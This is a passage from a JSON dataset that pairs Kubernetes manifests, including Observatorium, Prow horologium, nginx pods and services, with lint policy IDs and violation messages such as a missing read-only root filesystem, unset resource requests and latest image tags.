    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"observatorium-api\" does not have a read-only root file system"
  },
  {
    "id": "1968",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"observatorium-api\" not found"
  },
  {
    "id": "1969",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"observatorium-api\" is not set to runAsNonRoot"
  },
  {
    "id": "1970",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"observatorium-api\" has cpu request 0"
  },
  {
    "id": "1971",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"observatorium-api\" has memory limit 0"
  },
  {
    "id": "1972",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "1973",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"horologium\" not found"
  },
  {
    "id": "1974",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "1975",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "1976",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "1977",
    "manifest_path": "data/manifests/the_stack_sample/sample_0461.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: vzconn-service\n  annotations:\n    cloud.google.com/load-balancer-type: internal\n    cloud.google.com/app-protocols: '{\"tcp-http2\":\"HTTP2\"}'\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 51600\n    protocol: TCP\n    targetPort: 51600\n    name: tcp-http2\n  selector:\n    name: vzconn-server\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:vzconn-server])"
  },
  {
    "id": "1978",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1979",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "1980",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "1981",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "1982",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "1983",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sample\" is using an invalid container image, \"ctf/sample-app:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1984",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "1985",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sample\" does not have a read-only root file system"
  },
  {
    "id": "1986",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sample\" is not set to runAsNonRoot"
  },
  {
    "id": "1987",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sample\" has cpu request 0"
  },
  {
    "id": "1988",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sample\" has memory limit 0"
  },
  {
    "id": "1989",
    "manifest_path": "data/manifests/the_stack_sample/sample_0465.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: donaldsebleung-com\n  name: donaldsebleung-com\n  namespace: donaldsebleung-com\nspec:\n  selector:\n    app: donaldsebleung-com\n  type: LoadBalancer\n  ports:\n  - name: https\n    port: 443\n    targetPort: 8443\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:donaldsebleung-com])"
  },
  {
    "id": "1990",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1991",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "1992",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "1993",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "1994",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "1995",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "latest-tag",
